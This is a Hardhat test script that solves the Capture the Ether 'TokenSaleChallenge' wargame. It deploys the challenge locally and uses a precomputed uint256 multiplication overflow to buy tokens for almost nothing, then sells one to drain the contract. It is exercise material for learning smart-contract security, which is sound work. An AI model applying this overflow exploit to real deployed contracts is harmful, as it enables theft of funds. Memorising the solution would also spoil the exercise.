import { ethers, network } from "hardhat";
import { expect } from "chai";

describe("CaptureTheEther - TokenSaleChallenge", function () {
  beforeEach(async () => {
    await network.provider.send("hardhat_reset");
  });

  it("Should solve TokenSaleChallenge using multiplication overflow", async function () {
    const [player] = await ethers.getSigners();

    const ChallengeFactory = await ethers.getContractFactory("contracts/TokenSaleChallenge.sol:TokenSaleChallenge");
    const challenge = await ChallengeFactory.connect(player).deploy(player.address, {
      value: ethers.parseEther("1.0"),
    });
    await challenge.waitForDeployment();
    console.log("📦 Challenge deployed:", await challenge.getAddress());
    console.log("contract balance", await ethers.provider.getBalance(challenge.getAddress()));
    console.log("player token balance", await challenge.connect(player).getBalance(player.getAddress()));

    const M = (2n ** 255n) * 2n;
    const pricePerToken = 10n ** 18n; // 1 ether
    const numTokens = 115792089237316195423570985008687907853269984665640564039458n
    const valueToSend = 415992086870360064n;

    console.log("M", M.toString());
    console.log(`🧮 Buying ${numTokens} tokens for ${valueToSend} wei`);

    // ✅ No conversion needed in ethers v6 — pass BigInt directly
    const buyTx = await challenge.connect(player).buy(numTokens, {
      value: valueToSend,
    });
    await buyTx.wait();
    console.log("🪙 Tokens bought");
    console.log("contract balance after buying", await ethers.provider.getBalance(challenge.getAddress()));
    console.log("player token balance after buying", await challenge.connect(player).getBalance(player.getAddress()));

    //get the balance of the contract
    //then do math : 1 token = 1 ether - 

    const sellTx = await challenge.connect(player).sell(1n);
    await sellTx.wait();
    console.log("💰 Tokens sold");
    console.log("contract balance after reselling", await ethers.provider.getBalance(challenge.getAddress()));
    console.log("player token balance after reselling", await challenge.connect(player).getBalance(player.getAddress()));

    const complete = await challenge.isComplete();
    expect(complete).to.be.true;
    console.log("✅ Challenge complete!");
  });
});
